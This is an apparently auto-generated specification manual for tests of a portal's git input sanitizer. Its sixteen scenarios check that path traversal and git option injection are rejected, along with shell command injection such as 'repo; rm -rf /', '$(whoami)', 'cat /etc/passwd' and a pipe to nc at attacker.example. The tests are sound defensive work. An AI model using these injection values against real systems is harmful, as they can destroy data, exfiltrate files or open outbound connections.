# Portal Git Sanitize Specification

> Tests covering portal git input sanitization.

| Tests | Active | Skipped | Pending |
|-------|--------|---------|--------:|
| 16 | 16 | 0 | 0 |

<details>
<summary>Full Scenario Manual</summary>

# Portal Git Sanitize Specification

## Scenarios

### portal git input sanitization

#### accepts a normal repository name

**Manual warnings:**
- invalid manual visibility metadata: # @manual scenario evidence (expected show, folded, detail, or skip)


- accepts a normal repository name
   - Expected: _rejects_repo_name("simple") is false


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("accepts a normal repository name")
expect(_rejects_repo_name("simple")).to_equal(false)
```

</details>

#### rejects a repository name with parent-directory traversal

- rejects a repository name with parent-directory traversal
   - Expected: _rejects_repo_name("../../etc") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a repository name with parent-directory traversal")
expect(_rejects_repo_name("../../etc")).to_equal(true)
```

</details>

#### rejects a repository name that looks like an option

- rejects a repository name that looks like an option
   - Expected: _rejects_repo_name("--upload-pack=/bin/sh") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a repository name that looks like an option")
expect(_rejects_repo_name("--upload-pack=/bin/sh")).to_equal(true)
```

</details>

#### rejects a repository name with a path separator

- rejects a repository name with a path separator
   - Expected: _rejects_repo_name("a/b") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a repository name with a path separator")
expect(_rejects_repo_name("a/b")).to_equal(true)
```

</details>

#### rejects a repository name with shell metacharacters

- rejects a repository name with shell metacharacters
   - Expected: _rejects_repo_name("repo; rm -rf /") is true
   - Expected: _rejects_repo_name("repo$(whoami)") is true
   - Expected: _rejects_repo_name("repo`id`") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 5 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a repository name with shell metacharacters")
expect(_rejects_repo_name("repo; rm -rf /")).to_equal(true)
expect(_rejects_repo_name("repo$(whoami)")).to_equal(true)
expect(_rejects_repo_name("repo`id`")).to_equal(true)
```

</details>

#### accepts a normal branch ref

- accepts a normal branch ref
   - Expected: _rejects_ref("main") is false
   - Expected: _rejects_ref("release-1.0") is false


<details>
<summary>Executable SSpec</summary>

Runnable source: 4 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("accepts a normal branch ref")
expect(_rejects_ref("main")).to_equal(false)
expect(_rejects_ref("release-1.0")).to_equal(false)
```

</details>

#### rejects a ref with parent-directory traversal

- rejects a ref with parent-directory traversal
   - Expected: _rejects_ref("../HEAD") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a ref with parent-directory traversal")
expect(_rejects_ref("../HEAD")).to_equal(true)
```

</details>

#### rejects a ref that looks like a git option

- rejects a ref that looks like a git option
   - Expected: _rejects_ref("--output=/etc/passwd") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a ref that looks like a git option")
expect(_rejects_ref("--output=/etc/passwd")).to_equal(true)
```

</details>

#### rejects a ref with a colon (tree-ish injection)

- rejects a ref with a colon (tree-ish injection)
   - Expected: _rejects_ref("main:secret") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a ref with a colon (tree-ish injection)")
expect(_rejects_ref("main:secret")).to_equal(true)
```

</details>

#### rejects an empty ref

- rejects an empty ref
   - Expected: _rejects_ref("") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects an empty ref")
expect(_rejects_ref("")).to_equal(true)
```

</details>

#### accepts a normal nested file path

- accepts a normal nested file path
   - Expected: _rejects_path("src/app/main.spl") is false


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("accepts a normal nested file path")
expect(_rejects_path("src/app/main.spl")).to_equal(false)
```

</details>

#### accepts an empty path (repository root)

- accepts an empty path (repository root)
   - Expected: _rejects_path("") is false


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("accepts an empty path (repository root)")
expect(_rejects_path("")).to_equal(false)
```

</details>

#### rejects a path with parent-directory traversal

- rejects a path with parent-directory traversal
   - Expected: _rejects_path("../../../etc/passwd") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a path with parent-directory traversal")
expect(_rejects_path("../../../etc/passwd")).to_equal(true)
```

</details>

#### rejects an absolute path

- rejects an absolute path
   - Expected: _rejects_path("/etc/passwd") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects an absolute path")
expect(_rejects_path("/etc/passwd")).to_equal(true)
```

</details>

#### rejects a path that looks like a git option

- rejects a path that looks like a git option
   - Expected: _rejects_path("--output=owned") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 3 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a path that looks like a git option")
expect(_rejects_path("--output=owned")).to_equal(true)
```

</details>

#### rejects a path with shell metacharacters

- rejects a path with shell metacharacters
   - Expected: _rejects_path("file.txt; cat /etc/passwd") is true
   - Expected: _rejects_path("file|nc attacker.example 4444") is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 4 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req REQ-SSPEC-INTEGRATION
step("rejects a path with shell metacharacters")
expect(_rejects_path("file.txt; cat /etc/passwd")).to_equal(true)
expect(_rejects_path("file|nc attacker.example 4444")).to_equal(true)
```

</details>

## At a Glance

| Field | Value |
|-------|-------|
| Category | Application |
| Status | Active |
| Source | `test/02_integration/app/portal/portal_git_sanitize_spec.spl` |
| Updated | 2026-08-26 |
| Generator | `simple spipe-docgen` (Simple) |

## Overview

Tests covering portal git input sanitization.
- portal git input sanitization

## Scenario Summary

| Metric | Count |
|--------|------:|
| Total scenarios | 16 |
| Active scenarios | 16 |
| Slow scenarios | 0 |
| Skipped scenarios | 0 |
| Pending scenarios | 0 |


</details>

<!-- sspec-maintain:traceability:start -->
## Traceability

Requirements covered by the scenarios in this manual:

- `REQ-SSPEC-INTEGRATION`
<!-- sspec-maintain:traceability:end -->

<!-- sspec-maintain:provenance:start -->
## Generation history

- Canonical SPipe generation for source `499c916d74871e2dcb511cc5dd3297caceb878e476e054f7e8c355d86f9075d2`; maintenance tool `1`, rules `ssdoc-rules/1`.

Source SHA-256: `499c916d74871e2dcb511cc5dd3297caceb878e476e054f7e8c355d86f9075d2`.
<!-- sspec-maintain:provenance:end -->

<!-- sspec-maintain:scorecard:start -->
## SSpec documentization scorecard

Source SHA-256: `499c916d74871e2dcb511cc5dd3297caceb878e476e054f7e8c355d86f9075d2`  
Analyzer: `1`; rules: `ssdoc-rules/1`  
Raw score: **92/100**; effective score: **92/100**; blockers: **0**.

SSpec documentization score: 92/100
source: test/02_integration/app/portal/portal_git_sanitize_spec.spl
mirror: doc/06_spec/02_integration/app/portal/portal_git_sanitize_spec.md (current)
findings: 5 blockers: 0
  narrative=100 structure=100 oracle=100
  traceability=100 evidence=70 coverage=100 maintainability=70
  cache=not-used suppressed=0
  lint-owned related rules=SPIPE001,SPIPE002,SPIPE003,SPIPE004,SPIPE005,SPIPE006,SPIPE007
doc/06_spec/02_integration/app/portal/portal_git_sanitize_spec.md:1:1: advice SSDOC-MNT-005 [maintainability] (-10): generated manual lacks verification or troubleshooting guidance
  why: Operators need recovery and evidence interpretation guidance.
  improve: Author verification and recovery facts in SSpec and regenerate.
doc/06_spec/02_integration/app/portal/portal_git_sanitize_spec.md:1:1: warning SSDOC-MNT-008 [maintainability] (-20): manual is missing: purpose, audience, scope, assumptions/preconditions, primary workflow, unsupported/limitations, recovery/troubleshooting
  why: A test dump is not a complete professional specification manual.
  improve: Author the missing facts in SSpec and regenerate through canonical SPipe docgen.
test/02_integration/app/portal/portal_git_sanitize_spec.spl:27:1: warning SSDOC-EVD-001 [evidence] (-10): visible scenario 'accepts a normal repository name' has no retained capture or evidence
  why: Professional manuals need retained observable evidence.
  improve: Capture typed user/operator-facing evidence or explain why the oracle is complete.
test/02_integration/app/portal/portal_git_sanitize_spec.spl:32:1: warning SSDOC-EVD-001 [evidence] (-10): visible scenario 'rejects a repository name with parent-directory traversal' has no retained capture or evidence
  why: Professional manuals need retained observable evidence.
  improve: Capture typed user/operator-facing evidence or explain why the oracle is complete.
test/02_integration/app/portal/portal_git_sanitize_spec.spl:37:1: warning SSDOC-EVD-001 [evidence] (-10): visible scenario 'rejects a repository name that looks like an option' has no retained capture or evidence
  why: Professional manuals need retained observable evidence.
  improve: Capture typed user/operator-facing evidence or explain why the oracle is complete.
<!-- sspec-maintain:scorecard:end -->
